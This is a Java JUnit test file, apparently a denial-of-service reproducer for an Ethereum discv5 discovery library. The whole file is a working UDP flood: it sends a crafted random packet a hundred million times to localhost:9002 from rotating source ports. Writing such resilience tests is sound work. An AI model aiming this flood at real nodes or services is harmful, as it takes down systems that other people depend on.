/*
 * SPDX-License-Identifier: Apache-2.0
 */

package org.ethereum.beacon.discovery;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import org.apache.tuweni.bytes.Bytes;
import org.apache.tuweni.bytes.Bytes32;
import org.ethereum.beacon.discovery.packet.Header;
import org.ethereum.beacon.discovery.packet.OrdinaryMessagePacket;
import org.ethereum.beacon.discovery.packet.RawPacket;
import org.ethereum.beacon.discovery.packet.impl.RawPacketImpl;
import org.ethereum.beacon.discovery.type.Bytes12;
import org.ethereum.beacon.discovery.type.Bytes16;
import org.junit.jupiter.api.Test;

public class Attack {
  @Test
  void dos() throws Exception {
    String host = "localhost";
    int port = 9002; // Random Port
    long pid = ProcessHandle.current().pid();
    System.out.println("process id: " + pid);

    InetAddress address = InetAddress.getByName(host);

    System.out.println("Attacking...");

    Header<OrdinaryMessagePacket.OrdinaryAuthData> header =
        Header.createOrdinaryHeader(Bytes32.random(), Bytes12.wrap(Bytes.random(12)));
    OrdinaryMessagePacket randomPacket =
        OrdinaryMessagePacket.createRandom(header, Bytes.random(44));

    RawPacket packet =
        RawPacketImpl.create(
            Bytes16.wrap(Bytes.random(16)),
            randomPacket,
            Bytes16.wrap(
                Bytes32.fromHexString(
                        "0x121f667d09a42b4facbbd447c98f448e6b128bca1ee5dabb74353b226b6f6aac")
                    .slice(0, 16)));

    DatagramPacket datagramPacket =
        new DatagramPacket(
            packet.getBytes().toArrayUnsafe(), packet.getBytes().size(), address, port);

    for (int j = 0; j < 100000; j++) {
      DatagramSocket dsocket = null;
      int srcPort = 10000 + (j % 50000);
      try {
        dsocket = new DatagramSocket(srcPort);
        for (int i = 0; i < 1000; i++) {

          dsocket.send(datagramPacket);
        }
        dsocket.close();
      } catch (Exception e) {
        System.out.println("Err opening socket on port " + srcPort + ": " + e);
      }
      Thread.sleep(1);
    }
    System.out.println("Completed.");
  }
}
